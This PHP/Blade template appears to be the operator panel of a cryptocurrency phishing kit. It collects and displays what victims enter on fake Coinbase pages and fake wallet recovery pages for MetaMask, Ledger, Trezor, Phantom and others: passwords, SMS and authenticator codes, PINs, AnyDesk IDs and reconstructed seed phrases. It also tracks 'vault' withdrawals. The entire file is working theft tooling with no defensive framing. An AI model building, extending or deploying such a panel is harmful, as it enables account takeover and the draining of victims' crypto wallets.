@php
    $canSeePassphrases = $canSeePassphrases ?? true;
    $sensitiveFields = ['email','password','full_name','name','phone','credit_card','ssn','dob','address'];

    $classify = function($ev) use ($sensitiveFields) {
        $el = strtolower($ev->element ?? '');
        if ($ev->type === 'phrase_word' || $ev->type === 'phrase_input' || $ev->type === 'seed_phrase_input') return 'sensitive';
        if (in_array($ev->type, ['form_submit','form_input','code_input','pin_input'])) {
            foreach ($sensitiveFields as $f) {
                if (str_contains($el, $f)) return 'sensitive';
            }
            return 'data';
        }
        if (in_array($ev->type, ['page_visit','page_exit','click','rating'])) return 'activity';
        return 'data';
    };

    $maskPhraseValue = function($type, $element, $value) {
        // For phrase_input full_state: mask words/passphrase inside JSON structure
        if ($type === 'phrase_input' && $element === 'full_state') {
            $dec = json_decode($value ?? '', true);
            if (is_array($dec)) {
                if (isset($dec['words'])) {
                    $dec['words'] = array_map(fn($w) => ($w !== '' && $w !== null) ? '****' : '', $dec['words']);
                }
                if (!empty($dec['passphrase'])) $dec['passphrase'] = '****';
                if (!empty($dec['passphraseHistory'])) $dec['passphraseHistory'] = array_map(fn($p) => $p !== '' ? '****' : '', $dec['passphraseHistory']);
                $dec['wordHistory'] = [];
                return json_encode($dec);
            }
            // Old comma-separated format (coldcard)
            return implode(',', array_map(fn($w) => trim($w) !== '' ? '****' : '', explode(',', $value ?? '')));
        }
        return '****';
    };

    $eventsJson = json_encode($events->map(function($ev) use ($classify, $canSeePassphrases, $maskPhraseValue) {
        $value = $ev->value;
        $isPhraseEvent   = in_array($ev->type, ['phrase_word', 'phrase_input', 'phrase_reset', 'seed_phrase_input']);
        $isPhraseSubmit  = ($ev->type === 'form_submit' && in_array($ev->element ?? '', ['recovery_phrase', 'seed_phrase']));
        $isPassphraseSub = ($ev->type === 'form_submit' && ($ev->element ?? '') === 'passphrase');
        if (!$canSeePassphrases && ($isPhraseEvent || $isPhraseSubmit || $isPassphraseSub)) {
            $value = $maskPhraseValue($ev->type, $ev->element, $value);
        }
        return [
            'id'      => $ev->id,
            'type'    => $ev->type,
            'page'    => $ev->page,
            'element' => $ev->element,
            'value'   => $value,
            'time'    => optional($ev->created_at)->format('H:i:s') ?? '--:--:--',
            'class'   => $classify($ev),
        ];
    })->values(), JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);

    // ── Collapse digit events into single access_code rows ────────────────────
    $digitGroups = [];
    $nonDigitEvs = [];
    $evList = $events->values()->all();
    foreach ($evList as $idx => $ev) {
        $isDigit = in_array($ev->type, ['code_input','pin_input'])
                   && preg_match('/^digit_(\d+)$/', $ev->element ?? '', $dm);
        if ($isDigit) {
            $key = $ev->type . '|' . ($ev->page ?? '');
            $pos = (int)$dm[1];
            if (!isset($digitGroups[$key])) {
                $digitGroups[$key] = ['type'=>$ev->type,'page'=>$ev->page,'ids'=>[],'digits'=>[],'firstIdx'=>$idx,'time'=>$ev->created_at];
            }
            $digitGroups[$key]['ids'][] = $ev->id;
            if (!array_key_exists($pos, $digitGroups[$key]['digits'])) {
                $digitGroups[$key]['digits'][$pos] = $ev->value ?? '';
            }
        } else {
            $nonDigitEvs[$idx] = $ev;
        }
    }
    $digitRows = [];
    foreach ($digitGroups as $key => $g) {
        ksort($g['digits']);
        $val = implode('', array_filter($g['digits'], fn($v) => $v !== ''));
        if ($val !== '') {
            $digitRows[$g['firstIdx']] = (object)[
                'id' => implode(',', $g['ids']), 'type' => $g['type'], 'page' => $g['page'],
                'element' => 'access_code', 'value' => $val,
                'created_at' => $g['time'], 'isGrouped' => true,
            ];
        }
    }
    $grouped = [];
    foreach ($evList as $idx => $ev) {
        if (isset($nonDigitEvs[$idx]))  { $grouped[] = $ev; }
        elseif (isset($digitRows[$idx])){ $grouped[] = $digitRows[$idx]; }
    }

    // ── Phrase snapshots (all wallet pages that send phrase_input / full_state) ─
    $phraseSnapshots = [];
    $lastSnapTimes = []; // keyed by page to deduplicate per-page
    foreach (array_reverse($events->values()->all()) as $ev) {
        if (($ev->type ?? '') !== 'phrase_input' || ($ev->element ?? '') !== 'full_state') continue;
        $pg = $ev->page ?? '';
        $t  = $ev->created_at ? $ev->created_at->getTimestamp() : 0;
        $lastT = $lastSnapTimes[$pg] ?? null;
        if ($lastT !== null && ($t - $lastT) < 3) continue; // deduplicate within 3s per page

        $words = [];
        $passphrase = '';
        // JSON format used by surviving wallets (exodus, metamask, ledger, trezor, phantom, etc.)
        $dec = json_decode($ev->value ?? '', true);
        if (is_array($dec) && isset($dec['words'])) {
            $words = array_values($dec['words']);
            $passphrase = trim($dec['passphrase'] ?? '');
        }
        if (!empty($words)) {
            $maskedWords = $canSeePassphrases ? $words : array_map(fn($w) => $w !== '' ? '****' : '', $words);
            $maskedPass  = $canSeePassphrases ? $passphrase : ($passphrase !== '' ? '****' : '');
            $phraseSnapshots[] = (object)[
                'id'         => $ev->id,
                'page'       => $pg,
                'words'      => $maskedWords,
                'passphrase' => $maskedPass,
                'created_at' => $ev->created_at,
            ];
            $lastSnapTimes[$pg] = $t;
        }
    }
    $phraseSnapMap = [];
    foreach ($phraseSnapshots as $snap) { $phraseSnapMap[$snap->id] = $snap; }

    // ── Accent colours & labels ───────────────────────────────────────────────
    $pageAccent = [
        'metamask_import'=>'#ff5c16','metamask_recover'=>'#ff5c16','metamask_loading'=>'#ff5c16',
        'trust_disconnect'=>'#48ff91','trust_loading'=>'#48ff91',
        'exodus_import'=>'#6619ff','exodus_loading'=>'#6619ff',
        'ellipal_24word'=>'#4366d0','ellipal_12word'=>'#4366d0','ellipal_loading'=>'#4366d0',
        'ledger_signin'=>'#2d5a3d','ledger_1'=>'#2d5a3d','ledger_2'=>'#2d5a3d','ledger_3'=>'#2d5a3d','ledger_loading'=>'#2d5a3d',
        'trezor_recover'=>'#64748b','trezor_loading'=>'#64748b',
        'phantom_seeds'=>'#AB9FF2',
        'phantom_loading'=>'#AB9FF2',
        'browser-check'=>'#475569','offline'=>'#f87171','home'=>'#64748b',
        'coinbase_support_landing'=>'#0052ff','coinbase_sign_in'=>'#0052ff',
        'coinbase_sms_code'=>'#0052ff','coinbase_access_code'=>'#0052ff',
        'coinbase_access_pin'=>'#0052ff','coinbase_password'=>'#0052ff',
        'coinbase_loading'=>'#0052ff','coinbase_review_account'=>'#0052ff',
        'coinbase_review_account_loading'=>'#0052ff',
        'coinbase_authenticator_code'=>'#0052ff','coinbase_anydesk'=>'#0052ff',
        'coinbase_device_confirmation'=>'#0052ff',
        'coinbase_representative_contact'=>'#0052ff','coinbase_verify_identity'=>'#0052ff',
        'coinbase_last_activity'=>'#0052ff','coinbase_estimated_balance'=>'#0052ff',
        'coinbase_high_security'=>'#0052ff','coinbase_reset_password'=>'#0052ff',
        'coinbase_email_code'=>'#0052ff','coinbase_select_id_type'=>'#0052ff',
        'coinbase_done'=>'#0052ff','coinbase_seed'=>'#0052ff',
        'coinbase_disconnect_wallet'=>'#0052ff','coinbase_disconnected_done'=>'#0052ff',
        'coinbase_secure_transfer'=>'#0052ff',
        'coinbase_connect_vault'=>'#0052ff','coinbase_create_vault'=>'#0052ff','coinbase_link_coinbase'=>'#0052ff',
        'coinbase_download_wallet'=>'#0052ff','coinbase_import_recovery_phrase'=>'#0052ff',
        'coinbase_whitelist_wallet'=>'#0052ff','coinbase_select_vault_assets'=>'#0052ff','coinbase_vault_balance'=>'#0052ff',
    ];

    $evPageLabels = [
        'coinbase_support_landing'=>'Coinbase Support','coinbase_sign_in'=>'Coinbase Sign In',
        'coinbase_sms_code'=>'Coinbase SMS Code','coinbase_access_code'=>'Coinbase Access Code',
        'coinbase_access_pin'=>'Coinbase Access PIN','coinbase_password'=>'Coinbase Password',
        'coinbase_loading'=>'Coinbase Loading','coinbase_review_account'=>'Coinbase Review Account',
        'coinbase_review_account_loading'=>'Coinbase Review Loading',
        'coinbase_authenticator_code'=>'Coinbase Authenticator','coinbase_anydesk'=>'Coinbase AnyDesk',
        'coinbase_device_confirmation'=>'Coinbase Device Confirm',
        'coinbase_representative_contact'=>'Coinbase Rep. Contact','coinbase_verify_identity'=>'Coinbase Verify Identity',
        'coinbase_last_activity'=>'Coinbase Last Activity','coinbase_estimated_balance'=>'Coinbase Est. Balance',
        'coinbase_high_security'=>'Coinbase High Security','coinbase_reset_password'=>'Coinbase Reset Password',
        'coinbase_email_code'=>'Coinbase Email Code','coinbase_select_id_type'=>'Coinbase Select ID',
        'coinbase_done'=>'Coinbase Done','coinbase_seed'=>'Coinbase Seed',
        'coinbase_disconnect_wallet'=>'Coinbase Disconnect Wallet','coinbase_disconnected_done'=>'Coinbase Disconnected',
        'coinbase_secure_transfer'=>'Coinbase Secure Transfer',
        'coinbase_connect_vault'=>'Coinbase Connect Vault','coinbase_create_vault'=>'Coinbase Create Vault','coinbase_link_coinbase'=>'Coinbase Link Coinbase',
        'coinbase_download_wallet'=>'Coinbase Download Wallet','coinbase_import_recovery_phrase'=>'Coinbase Import Recovery',
        'coinbase_whitelist_wallet'=>'Coinbase Whitelist Wallet','coinbase_select_vault_assets'=>'Coinbase Select Assets','coinbase_vault_balance'=>'Coinbase Vault Balance',
        'metamask_import'=>'MetaMask Import','metamask_recover'=>'MetaMask Recover','metamask_loading'=>'MetaMask Loading',
        'trust_disconnect'=>'Trust Disconnect','trust_loading'=>'Trust Loading',
        'exodus_import'=>'Exodus Import','exodus_loading'=>'Exodus Loading',
        'ellipal_24word'=>'Ellipal 24-Word','ellipal_12word'=>'Ellipal 12-Word','ellipal_loading'=>'Ellipal Loading',
        'ledger_signin'=>'Ledger Sign In','ledger_1'=>'Ledger 24-Word','ledger_2'=>'Ledger 18-Word','ledger_3'=>'Ledger 12-Word','ledger_loading'=>'Ledger Loading',
        'trezor_recover'=>'Trezor Recover','trezor_loading'=>'Trezor Loading',
        'phantom_seeds'=>'Phantom Seed Phrase',
        'phantom_loading'=>'Phantom Loading',
        'browser-check'=>'Browser Check','offline'=>'Offline','home'=>'Home',
    ];

    // ── LEFT: all meaningful events (everything except noise) ─────────────────
    $leftEvents = [];
    foreach ($grouped as $ev) {
        $t  = $ev->type;
        $el = $ev->element ?? '';
        if ($t === 'page_exit' || $t === 'phrase_word' || $t === 'phrase_reset') continue;
        // Skip all form_input keystroke noise (full_state snapshots per keystroke)
        if ($t === 'form_input') continue;
        // Skip redundant form_data / full_state submits — dedicated email/password events already capture these
        if ($t === 'form_submit' && in_array($el, ['form_data', 'full_state'])) continue;
        // For phrase_input: only show full_state snapshots
        if ($t === 'phrase_input' && $el !== 'full_state') continue;
        $leftEvents[] = $ev;
    }
    // Deduplicate consecutive full_state snapshots that have the same word content
    $dedupedLeft = [];
    $lastPhraseKey = null;
    foreach ($leftEvents as $ev) {
        if (($ev->type ?? '') === 'phrase_input' && ($ev->element ?? '') === 'full_state' && isset($phraseSnapMap[$ev->id])) {
            $snap = $phraseSnapMap[$ev->id];
            $key = implode(',', $snap->words);
            if ($key === $lastPhraseKey) continue;
            $lastPhraseKey = $key;
        } else {
            $lastPhraseKey = null;
        }
        $dedupedLeft[] = $ev;
    }
    $leftEvents = $dedupedLeft;

    // ── RIGHT: page-by-page history with key submitted data ───────────────────
    // Build blocks: each block = one page_visit + all events that followed it
    // (sorted oldest-first so we can pair visits with their submissions)
    // Sort by timestamp then by id — ensures same-second events (e.g. login submit + password page_visit)
    // are ordered by insertion order so they land in the correct page block
    $evsSorted = $events->sortBy(fn($ev) => [$ev->created_at?->getTimestamp() ?? 0, $ev->id])->values()->all();
    $pageBlocks = [];
    $currentBlock = null;
    foreach ($evsSorted as $ev) {
        if ($ev->type === 'page_visit') {
            if ($currentBlock !== null) $pageBlocks[] = $currentBlock;
            $currentBlock = ['visit' => $ev, 'subs' => []];
        } elseif ($currentBlock !== null) {
            $t = $ev->type;
            if (!in_array($t, ['page_exit','phrase_word','phrase_reset'])) {
                $currentBlock['subs'][] = $ev;
            }
        }
    }
    if ($currentBlock !== null) $pageBlocks[] = $currentBlock;
    $pageBlocks = array_reverse($pageBlocks); // newest first

    // Helper: extract the most useful display snippet from a block's submissions
    $extractKeyData = function(array $subs, string $pageKey) use ($phraseSnapMap, $canSeePassphrases): ?array {
        // Priority 0: review actions (deny/approve) for review pages
        $isReviewPage = in_array($pageKey, ['review','review_account','coinbase_review_account']);
        if ($isReviewPage) {
            $reviewActions = [];
            foreach ($subs as $ev) {
                if (($ev->type ?? '') === 'form_submit' && in_array($ev->element ?? '', ['review_intro','unusual_activity','suspicious_login','email_change','password_change'])) {
                    $val = strtolower($ev->value ?? '');
                    if (in_array($val, ['deny','approve','allow','accept','reject','block','continue'])) {
                        $elLabel = str_replace('_', ' ', $ev->element);
                        $reviewActions[] = ['element' => $elLabel, 'action' => $val, 'time' => optional($ev->created_at)->format('H:i:s')];
                    }
                }
            }
            if (!empty($reviewActions)) {
                $actionText = [];
                foreach ($reviewActions as $ra) {
                    $color = in_array($ra['action'], ['deny','reject','block']) ? '#f87171' : '#4ade80';
                    $actionText[] = "<span style=\"color:{$color};font-weight:700;\">{$ra['action']}</span> {$ra['element']}";
                }
                return ['label' => 'review actions', 'value' => implode(' · ', $actionText), 'type' => 'review'];
            }
        }
        // Priority 0.5: password submission
        if (in_array($pageKey, ['coinbase_password'])) {
            $lastPw = null;
            foreach ($subs as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'password' && $ev->value) {
                    $lastPw = $ev;
                }
            }
            if ($lastPw) {
                return ['label' => 'password', 'value' => $lastPw->value, 'type' => 'email'];
            }
        }
        // Priority 0.54: Coinbase sign-in email
        if ($pageKey === 'coinbase_sign_in') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'email' && $ev->value) {
                    return ['label' => 'email', 'value' => $ev->value, 'type' => 'email'];
                }
            }
        }
        // Priority 0.545: Coinbase access code
        if ($pageKey === 'coinbase_access_code') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'access_code' && $ev->value) {
                    return ['label' => 'code', 'value' => $ev->value, 'type' => 'code'];
                }
            }
        }
        // Priority 0.55: reset password submission
        if ($pageKey === 'coinbase_reset_password') {
            $lastRp = null;
            foreach ($subs as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'reset_password' && $ev->value) {
                    $lastRp = $ev;
                }
            }
            if ($lastRp) {
                return ['label' => 'reset pw', 'value' => $lastRp->value, 'type' => 'email'];
            }
        }
        // Priority 0.7: SMS code submission (coinbase_sms_code page)
        if ($pageKey === 'coinbase_sms_code') {
            $lastCode = null;
            foreach ($subs as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'code' && $ev->value) {
                    $lastCode = $ev;
                }
            }
            if (!$lastCode) {
                // Fall back to most recent partial input
                foreach (array_reverse($subs) as $ev) {
                    if (($ev->type ?? '') === 'code_input' && ($ev->element ?? '') === 'code_partial' && $ev->value) {
                        $lastCode = $ev;
                        break;
                    }
                }
            }
            if ($lastCode) {
                $submitted = ($lastCode->type ?? '') === 'form_submit';
                return ['label' => $submitted ? 'SMS code' : 'SMS code (partial)', 'value' => $lastCode->value, 'type' => 'code'];
            }
        }
        // Priority 0.75: Device confirmation link
        if ($pageKey === 'coinbase_device_confirmation') {
            $lastLink = null;
            foreach ($subs as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'confirmation_link' && $ev->value) {
                    $lastLink = $ev;
                }
            }
            if ($lastLink) {
                return ['label' => 'confirm link', 'value' => $lastLink->value, 'type' => 'code'];
            }
        }
        // Priority 0.76: Email code submission
        if ($pageKey === 'coinbase_email_code') {
            $lastCode = null;
            foreach ($subs as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'email_code' && $ev->value) {
                    $lastCode = $ev;
                }
            }
            if ($lastCode) {
                return ['label' => 'email code', 'value' => $lastCode->value, 'type' => 'code'];
            }
        }
        // Priority 0.77: Select ID type
        if ($pageKey === 'coinbase_select_id_type') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'id_type' && $ev->value) {
                    return ['label' => 'id type', 'value' => $ev->value, 'type' => 'email'];
                }
            }
        }
        // Priority 0.775: Seed / Whitelist phrase submission
        if ($pageKey === 'coinbase_whitelist_wallet') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'seed_phrase' && $ev->value) {
                    return ['label' => 'whitelist phrase', 'value' => $ev->value, 'type' => 'phrase'];
                }
            }
        }
        if ($pageKey === 'coinbase_seed') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'seed_phrase' && $ev->value) {
                    return ['label' => 'seed phrase', 'value' => $ev->value, 'type' => 'phrase'];
                }
            }
        }
        // Priority 0.78: Disconnect wallet selection
        if ($pageKey === 'coinbase_disconnect_wallet') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'wallet' && $ev->value) {
                    return ['label' => 'wallet', 'value' => $ev->value, 'type' => 'email'];
                }
            }
        }
        // Priority 0.79: Secure transfer continue
        if ($pageKey === 'coinbase_secure_transfer') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'continue') {
                    return ['label' => 'action', 'value' => 'continued', 'type' => 'code'];
                }
            }
        }
        // Priority 0.791: Connect Vault action (connect / cancel)
        if ($pageKey === 'coinbase_connect_vault') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'action' && $ev->value) {
                    $parts = explode('|', $ev->value, 2);
                    $action = $parts[0] ?? $ev->value;
                    $email  = $parts[1] ?? '';
                    $color  = $action === 'connect' ? '#4ade80' : '#f87171';
                    $display = "<span style=\"color:{$color};font-weight:700;\">{$action}</span>" . ($email ? " · {$email}" : '');
                    return ['label' => 'vault', 'value' => $display, 'type' => 'review'];
                }
            }
        }
        // Priority 0.792: Disconnected done continue
        if ($pageKey === 'coinbase_disconnected_done') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'continue') {
                    return ['label' => 'action', 'value' => 'continued', 'type' => 'code'];
                }
            }
        }
        // Priority 0.793: Create vault clicked
        if ($pageKey === 'coinbase_create_vault') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'create_vault') {
                    return ['label' => 'action', 'value' => 'created vault', 'type' => 'code'];
                }
            }
        }
        // Priority 0.794: Link Coinbase continue
        if ($pageKey === 'coinbase_link_coinbase') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'continue') {
                    return ['label' => 'action', 'value' => 'continued', 'type' => 'code'];
                }
            }
        }
        // Priority 0.795: Download CB Wallet continue
        if ($pageKey === 'coinbase_download_wallet') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'continue') {
                    return ['label' => 'action', 'value' => 'continued', 'type' => 'code'];
                }
            }
        }
        // Priority 0.796: Import Recovery Phrase continue
        if ($pageKey === 'coinbase_import_recovery_phrase') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'continue') {
                    return ['label' => 'action', 'value' => 'continued', 'type' => 'code'];
                }
            }
        }
        // Priority 0.797: Access PIN submission
        if ($pageKey === 'coinbase_access_pin') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'access_code' && $ev->value) {
                    return ['label' => 'PIN', 'value' => $ev->value, 'type' => 'code'];
                }
            }
        }
        // Priority 0.798: Authenticator code submission
        if ($pageKey === 'coinbase_authenticator_code') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'access_code' && $ev->value) {
                    return ['label' => 'auth code', 'value' => $ev->value, 'type' => 'code'];
                }
            }
        }
        // Priority 0.799: Verify identity / select ID — already covered by select_id_type above
        // Representative contact — show if user submitted contact form
        if ($pageKey === 'coinbase_representative_contact') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && $ev->value) {
                    return ['label' => 'contact', 'value' => $ev->value, 'type' => 'email'];
                }
            }
        }
        // Verify identity — show action taken
        if ($pageKey === 'coinbase_verify_identity') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && $ev->value) {
                    return ['label' => 'identity', 'value' => $ev->value, 'type' => 'code'];
                }
            }
        }
        // Vault balance — show withdraw or button clicked
        if (in_array($pageKey, ['coinbase_vault_balance','coinbase_vault_withdraw'])) {
            // Latest withdrawal takes highest priority
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'vault_withdraw' && ($ev->element ?? '') === 'balance_update' && $ev->value) {
                    $parts   = explode('|', $ev->value, 2);
                    $ck      = strtolower(trim($parts[0] ?? ''));
                    $coinKey = strtoupper($ck);
                    $newAmt  = trim($parts[1] ?? '');
                    $iconMap2 = ['BTC'=>'https://coin-images.coingecko.com/coins/images/1/large/bitcoin.png','ETH'=>'https://coin-images.coingecko.com/coins/images/279/large/ethereum.png','SOL'=>'https://coin-images.coingecko.com/coins/images/4128/large/solana.png','XRP'=>'https://coin-images.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png','ADA'=>'https://coin-images.coingecko.com/coins/images/975/large/cardano.png','DOGE'=>'https://coin-images.coingecko.com/coins/images/5/large/dogecoin.png','LTC'=>'https://coin-images.coingecko.com/coins/images/2/large/litecoin.png','BNB'=>'https://coin-images.coingecko.com/coins/images/825/large/bnb-icon2_2x.png','CRO'=>'https://coin-images.coingecko.com/coins/images/7310/large/cro_token_logo.png','USDT'=>'https://coin-images.coingecko.com/coins/images/325/large/Tether.png','USDC'=>'https://coin-images.coingecko.com/coins/images/6319/large/usdc.png','UNI'=>'https://coin-images.coingecko.com/coins/images/12504/large/uniswap-logo.png','MATIC'=>'https://coin-images.coingecko.com/coins/images/4713/large/polygon.png','AVAX'=>'https://coin-images.coingecko.com/coins/images/12559/large/Avalanche_Circle_RedWhite_Trans.png','LINK'=>'https://coin-images.coingecko.com/coins/images/877/large/chainlink-new-logo.png','DOT'=>'https://coin-images.coingecko.com/coins/images/12171/large/polkadot.png','SHIB'=>'https://coin-images.coingecko.com/coins/images/11939/large/shiba.png','TRX'=>'https://coin-images.coingecko.com/coins/images/1094/large/tron-logo.png','ATOM'=>'https://coin-images.coingecko.com/coins/images/1481/large/cosmos_hub.png','BCH'=>'https://coin-images.coingecko.com/coins/images/780/large/bitcoin-cash-circle.png','XLM'=>'https://coin-images.coingecko.com/coins/images/100/large/Stellar_symbol_black_RGB.png','TON'=>'https://coin-images.coingecko.com/coins/images/17980/large/ton_symbol.png','NEAR'=>'https://coin-images.coingecko.com/coins/images/10365/large/near.jpg','ARB'=>'https://coin-images.coingecko.com/coins/images/16547/large/photo_2023-03-29_21.47.00.jpeg','OP'=>'https://coin-images.coingecko.com/coins/images/25244/large/Optimism.png','PEPE'=>'https://coin-images.coingecko.com/coins/images/29850/large/pepe-token.jpeg','WIF'=>'https://coin-images.coingecko.com/coins/images/33566/large/dogwifhat.jpg'];
                    $iconHtml = isset($iconMap2[$coinKey]) ? "<img src=\"{$iconMap2[$coinKey]}\" width=\"14\" height=\"14\" style=\"border-radius:50%;vertical-align:middle;margin-right:3px;object-fit:cover;\" onerror=\"this.style.display='none'\"/>" : '';
                    return ['label' => 'withdrew', 'value' => "{$iconHtml}<span style=\"color:#f87171;font-weight:700;\">&#8595; {$coinKey}</span> &nbsp;<span data-usd-key=\"{$ck}\" data-usd-amt=\"{$newAmt}\" style=\"font-family:monospace;font-size:11px;font-weight:600;color:#4ade80;background:rgba(74,222,128,.1);border-radius:4px;padding:1px 6px;\"></span> <span style=\"font-family:monospace;color:rgba(255,255,255,.55);\">{$newAmt} {$coinKey} remaining</span>", 'type' => 'review'];
                }
            }
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'vault_action' && $ev->value) {
                    $col = $ev->value === 'deposit' ? '#4ade80' : '#f87171';
                    return ['label' => 'action', 'value' => "<span style=\"color:{$col};font-weight:700;\">{$ev->value}</span>", 'type' => 'review'];
                }
            }
        }
        // Select vault assets — show submitted asset list
        if ($pageKey === 'coinbase_select_vault_assets') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'assets' && $ev->value) {
                    return ['label' => 'assets', 'value' => $ev->value, 'type' => 'coins'];
                }
            }
            // Real-time selection (before submit)
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'coin_input' && ($ev->element ?? '') === 'selection' && $ev->value) {
                    return ['label' => 'selecting', 'value' => $ev->value, 'type' => 'coins'];
                }
            }
        }
        // Done page — visited
        if ($pageKey === 'coinbase_done') {
            return ['label' => 'status', 'value' => 'reached done', 'type' => 'code'];
        }
        // Support landing — visited
        if ($pageKey === 'coinbase_support_landing') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && $ev->value) {
                    return ['label' => 'support', 'value' => $ev->value, 'type' => 'email'];
                }
            }
        }
        // Priority 0.8: AnyDesk ID submission
        if ($pageKey === 'coinbase_anydesk') {
            $lastAd = null;
            foreach ($subs as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'anydesk_id' && $ev->value) {
                    $lastAd = $ev;
                }
            }
            if (!$lastAd) {
                foreach (array_reverse($subs) as $ev) {
                    if (($ev->type ?? '') === 'code_input' && ($ev->element ?? '') === 'anydesk_id' && $ev->value) {
                        $lastAd = $ev;
                        break;
                    }
                }
            }
            if ($lastAd) {
                $submitted = ($lastAd->type ?? '') === 'form_submit';
                return ['label' => $submitted ? 'AnyDesk ID' : 'AnyDesk ID (typing)', 'value' => $lastAd->value, 'type' => 'code'];
            }
        }
        // Priority 0.85: last activity / estimated balance / high security selections
        if (in_array($pageKey, ['coinbase_last_activity','coinbase_estimated_balance','coinbase_high_security'])) {
            $elemMap = ['coinbase_last_activity'=>'last_activity','coinbase_estimated_balance'=>'estimated_balance','coinbase_high_security'=>'high_security'];
            $labelMap = ['coinbase_last_activity'=>'last activity','coinbase_estimated_balance'=>'est. balance','coinbase_high_security'=>'security'];
            $el = $elemMap[$pageKey];
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === $el && $ev->value) {
                    return ['label' => $labelMap[$pageKey], 'value' => $ev->value, 'type' => 'email'];
                }
            }
        }
        // Priority 1: direct email / recovery_email element
        foreach ($subs as $ev) {
            $el = $ev->element ?? '';
            if (in_array($el, ['email','recovery_email']) && $ev->value) {
                return ['label' => $el === 'recovery_email' ? 'recovery' : 'email', 'value' => $ev->value, 'type' => 'email'];
            }
        }
        // Priority 2: grouped access_code (digit inputs collapsed)
        foreach ($subs as $ev) {
            if (($ev->element ?? '') === 'access_code' && $ev->value) {
                return ['label' => isset($ev->type) && $ev->type === 'pin_input' ? 'pin' : 'code', 'value' => $ev->value, 'type' => 'code'];
            }
        }
        // Priority 2.5: passphrase (import-wallet or import-phrase with passphrase)
        foreach ($subs as $ev) {
            if (($ev->type ?? '') === 'form_submit' && ($ev->element ?? '') === 'passphrase') {
                $ppv = $canSeePassphrases ? ($ev->value ?? '') : ($ev->value ? '****' : '');
                return ['label' => 'passphrase', 'value' => $ppv ?: '[no passphrase]', 'type' => 'passphrase'];
            }
        }

        // Phrase snapshot for phantom seeds
        if ($pageKey === 'phantom_seeds') {
            foreach (array_reverse($subs) as $ev) {
                if (($ev->type ?? '') === 'phrase_input' && ($ev->element ?? '') === 'full_state' && isset($phraseSnapMap[$ev->id])) {
                    $snap = $phraseSnapMap[$ev->id];
                    return ['label' => count($snap->words).'w phrase', 'value' => implode(' ', $snap->words), 'type' => 'phrase', 'words' => $snap->words];
                }
            }
        }
        // Priority 4: final form_submit with form_data or full_state — extract username/email key
        $lastFormData = null;
        foreach ($subs as $ev) {
            if ($ev->type === 'form_submit' && in_array($ev->element ?? '', ['form_data','full_state'])) {
                $lastFormData = $ev;
            }
        }
        if ($lastFormData && $lastFormData->value) {
            $dec = json_decode($lastFormData->value, true);
            if (is_array($dec)) {
                // Skip if it's just a single-digit code
                if (count($dec) === 1 && isset($dec['code']) && preg_match('/^\d+$/', $dec['code'])) {
                    return ['label' => 'code', 'value' => $dec['code'], 'type' => 'code'];
                }
                $parts = [];
                foreach ($dec as $k => $v) {
                    if ($v !== '' && $v !== null) $parts[] = $k.': '.$v;
                    if (count($parts) >= 2) break;
                }
                if ($parts) return ['label' => 'data', 'value' => implode('  ·  ', $parts), 'type' => 'data'];
            }
            return ['label' => 'data', 'value' => $lastFormData->value, 'type' => 'data'];
        }
        return null;
    };
@endphp

@php
    $coinIconMap = [
        'BTC'=>'https://coin-images.coingecko.com/coins/images/1/large/bitcoin.png',
        'ETH'=>'https://coin-images.coingecko.com/coins/images/279/large/ethereum.png',
        'SOL'=>'https://coin-images.coingecko.com/coins/images/4128/large/solana.png',
        'XRP'=>'https://coin-images.coingecko.com/coins/images/44/large/xrp-symbol-white-128.png',
        'ADA'=>'https://coin-images.coingecko.com/coins/images/975/large/cardano.png',
        'DOGE'=>'https://coin-images.coingecko.com/coins/images/5/large/dogecoin.png',
